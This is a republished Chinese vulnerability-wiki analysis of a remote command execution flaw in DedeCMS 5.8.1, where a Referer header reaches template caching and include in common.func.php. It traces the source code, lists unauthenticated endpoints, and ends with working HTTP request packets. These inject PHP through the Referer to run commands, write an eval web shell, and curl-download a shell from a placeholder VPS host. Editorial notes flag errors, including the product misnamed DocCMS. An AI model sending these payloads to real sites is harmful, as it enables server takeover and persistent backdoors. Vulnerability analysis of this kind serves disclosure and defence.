---
version: "DedeCMS v5.81 beta 内测版（转载原文“漏洞影响”段）"
source: "Threekiii/Vulnerability-Wiki"
product: "DedeCMS (overview wrongly DocCMS)"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "DedeCMS-5.8.1-common.func.php-远程命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：5.8.1beta; unauthenticated error endpoints; writable included cache"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0b1057065a3a19c03220a879"
entity_id: "ve-0b1057065a3a19c03220a879"
schema_version: "1"
previous_version: "/plus/flink.php?dopost=save"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.8.1beta; unauthenticated error endpoints; writable included cache

- **事实待核（1）**：Wrong product DocCMS in description。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（2）**：Frontmatter version is endpoint /plus/flink.php?dopost=save, not version。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（3）**：Quoted system callable bypass relates to PHP tokenization, not simply missing quote filtering。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（4）**：Source snippet has assignment token\[0\]='306' in conditional; explain or verify exact upstream rather than silently correcting。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（5）**：Adds endpoint variants and GetResult/check code beyond other accounts; not exact duplicate。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# DedeCMS 5.8.1 common.func.php 远程命令执行漏洞

> 版本字段校订（2026-10-04）：代码、命令、路径、产品名或章节标记误入版本字段的值已逐字保存到对应 `previous_*` 字段；当前版本字段只记正文明确的来源范围，无范围时记为 unknown。后文对此元数据误填的旧说明描述校订前状态，其余实验条件与待核项仍按原文保留。

## 漏洞描述

DocCMS flink.php 文件存远程命令执行漏洞，攻击者通过漏洞可以执行任意命令

## 漏洞影响

```
DedeCMS v5.81 beta 内测版
```

## 网络测绘

```
"DedeCMS_V5.8.1"
```

## 漏洞复现

产品页面

![image-20220518145134124](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181451208.png)


查看文件 `include/common.func.php` 的 ShowMsg方法

![image-20220518145203093](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181452163.png)


```
function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0)
{
    if (empty($GLOBALS['cfg_plus_dir'])) {
        $GLOBALS['cfg_plus_dir'] = '..';
    }
    if ($gourl == -1) {
        $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        if ($gourl == "") {
            $gourl = -1;
        }
    }

    $htmlhead = "
    <html>\r\n<head>\r\n<title>DedeCMS提示信息</title>\r\n
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset={dede:global.cfg_soft_lang/}\" />
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\">
    <meta name=\"renderer\" content=\"webkit\">
    <meta http-equiv=\"Cache-Control\" content=\"no-siteapp\" />
    <link rel=\"stylesheet\" type=\"text/css\" href=\"{dede:global.cfg_assets_dir/}/pkg/uikit/css/uikit.min.css\" />
    <link rel=\"stylesheet\" type=\"text/css\" href=\"{dede:global.cfg_assets_dir/}/css/manage.dede.css\">
    <base target='_self'/>
    </head>
    <body>
    " . (isset($GLOBALS['ucsynlogin']) ? $GLOBALS['ucsynlogin'] : '') . "
    <center style=\"width:450px\" class=\"uk-container\">
    
    <div class=\"uk-card uk-card-small uk-card-default\" style=\"margin-top: 50px;\">
        <div class=\"uk-card-header\"  style=\"height:20px\">DedeCMS 提示信息！</div>

    <script>\r\n";
    $htmlfoot = "
    </script>
    
    
    </center>
    
    <script src=\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit.min.js\"></script>
	<script src=\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit-icons.min.js\"></script>
    </body>\r\n</html>\r\n";

    $litime = ($limittime == 0 ? 1000 : $limittime);
    $func = '';

    if ($gourl == '-1') {
        if ($limittime == 0) {
            $litime = 3000;
        }

        $gourl = "javascript:history.go(-1);";
    }

    if ($gourl == '' || $onlymsg == 1) {
        $msg = "<script>alert(\"" . str_replace("\"", "“", $msg) . "\");</script>";
    } else {
        //当网址为:close::objname 时, 关闭父框架的id=objname元素
        if (preg_match('/close::/', $gourl)) {
            $tgobj = trim(preg_replace('/close::/', '', $gourl));
            $gourl = 'javascript:;';
            $func .= "window.parent.document.getElementById('{$tgobj}').style.display='none';\r\n";
        }

        $func .= "var pgo=0;
      function JumpUrl(){
        if(pgo==0){ location='$gourl'; pgo=1; }
      }\r\n";
        $rmsg = $func;
        $rmsg .= "document.write(\"<div style='height:130px;font-size:10pt;background:#ffffff'><br />\");\r\n";
        $rmsg .= "document.write(\"" . str_replace("\"", "“", $msg) . "\");\r\n";
        $rmsg .= "document.write(\"";

        if ($onlymsg == 0) {
            if ($gourl != 'javascript:;' && $gourl != '') {
                $rmsg .= "<br /><a href='{$gourl}'>如果你的浏览器没反应，请点击这里...</a>";
                $rmsg .= "<br/></div>\");\r\n";
                $rmsg .= "setTimeout('JumpUrl()',$litime);";
            } else {
                $rmsg .= "<br/></div>\");\r\n";
            }
        } else {
            $rmsg .= "<br/><br/></div>\");\r\n";
        }
        $msg = $htmlhead . $rmsg . $htmlfoot;
    }
    
    $tpl = new DedeTemplate();
    $tpl->LoadString($msg);
    $tpl->Display();
}

/**
 *  获取验证码的session值
 *
 * @return string
 */
```

![image-20220518145232032](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181452079.png)


这里注意到 当 $gourl 变量为 -1 时调用 ShowMsg方法, 则请求参数 Referer 为用户可控参数

![image-20220518145245750](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181452841.png)


向下看，可以发现可控的变量传入两个方法

```
$tpl = new DedeTemplate();
$tpl->LoadString($msg);
$tpl->Display();
```

追踪方法来到 `include/dedetemplate.class.php` 文件

![image-20220518145306926](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181453003.png)


ParseTemplate() 则是模版渲染的方法，再往下看

```
public function Display()
    {
        global $gtmpfile;
        extract($GLOBALS, EXTR_SKIP);
        $this->WriteCache();
        include $this->cacheFile;
    }
```

追踪一下 `WriteCache()` 方法

![image-20220518145323275](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181453362.png)


看 GetResult() 方法 和 CheckDisableFunctions() 方法

```
public function GetResult()
    {
        if (!$this->isParse) {
            $this->ParseTemplate();
        }
        $addset = '';
        $addset .= '<' . '?php' . "\r\n" . 'if(!isset($GLOBALS[\'_vars\'])) $GLOBALS[\'_vars\'] = array(); ' . "\r\n" . '$fields = array();' . "\r\n" . '?' . '>';
        return preg_replace("/\?" . ">[ \r\n\t]{0,}<" . "\?php/", "", $addset . $this->sourceString);
    }
public function CheckDisabledFunctions($str, &$errmsg = '')
    {
        global $cfg_disable_funs;
        $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite';
        // 模板引擎增加disable_functions
        if (!defined('DEDEDISFUN')) {
            $tokens = token_get_all_nl($str);
            $disabled_functions = explode(',', $cfg_disable_funs);
            foreach ($tokens as $token) {
                if (is_array($token)) {
                    if ($token[0] = '306' && in_array($token[1], $disabled_functions)) {
                        $errmsg = 'DedeCMS Error:function disabled "' . $token[1] . '" <a href="http://help.dedecms.com/install-use/apply/2013/0711/2324.html" target="_blank">more...</a>';
                        return false;
                    }
                }
            }
        }
        return true;
    }
```

GetResult() 方法执行后返回的结果通过 CheckDisabledFunctions() 方法过滤后 经过Display() 的 `include $this->cacheFile;`

```
public function Display()
    {
        global $gtmpfile;
        extract($GLOBALS, EXTR_SKIP);
        $this->WriteCache();
        include $this->cacheFile;
    }
```

此时我们就可以通过控制 Referer请求头，来控制模版的渲染，绕过 CheckDisabledFunctions)方法的过滤 造成远程命令执行

![](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181453931.png)


通过正则找到受影响且无需身份认证的文件，来进行命令执行

```
/plus/flink.php?dopost=save
/plus/users_products.php?oid=1337
/plus/download.php?aid=1337
/plus/showphoto.php?aid=1337
/plus/users-do.php?fmdo=sendMail
/plus/posttocar.php?id=1337
/plus/vote.php?dopost=view
/plus/carbuyaction.php?do=clickout
/plus/recommend.php
........
```

![image-20220518145405375](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181454424.png)


这里利用没有过滤的双引号绕过 disables 禁止的函数

![image-20220518145425771](./.resource/DedeCMS-5.8.1-common.func.php-远程命令执行漏洞/media/202205181454853.png)


漏洞请求包

```
GET /plus/flink.php?dopost=save HTTP/1.1
Host:
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: <?php "system"(ls);?>
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```

```
GET /plus/flink.php?dopost=save&c=whoami HTTP/1.1
Host: 
Referer: <?php "system"($c);die;/*
```

```
GET /DedeCMS-5.8.1/plus/flink.php?dopost=save&c=<?php%20eval($_POST[1]);?> HTTP/1.1
Host: 
Referer: <?php "file_put_contents"('shell.php',$c);?>
```

```
GET /DedeCMS-5.8.1/plus/flink.php?dopost=save&c=curl%20http://<YOUR-VPS-IP>:<YOUR-VPS-PORT>/shell.php%20--output%20shell.php HTTP/1.1
Host: 
Referer: <?php "system"($c);die;/*
```


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
